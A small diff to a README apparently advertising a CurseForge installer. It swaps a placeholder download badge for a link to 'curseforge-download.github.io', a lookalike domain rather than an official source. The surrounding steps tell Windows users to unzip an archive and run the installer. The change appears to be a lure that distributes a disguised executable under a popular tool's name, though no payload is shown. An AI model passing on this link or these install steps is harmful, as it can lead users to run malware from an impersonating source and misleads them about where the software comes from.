@@ -8,7 +8,7 @@ Developed by Overwolf, CurseForge includes **automatic mod updates, library back
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-orange?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-orange?style=for-the-badge)](https://curseforge-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the **CurseForge Installer** on your Windows PC.  
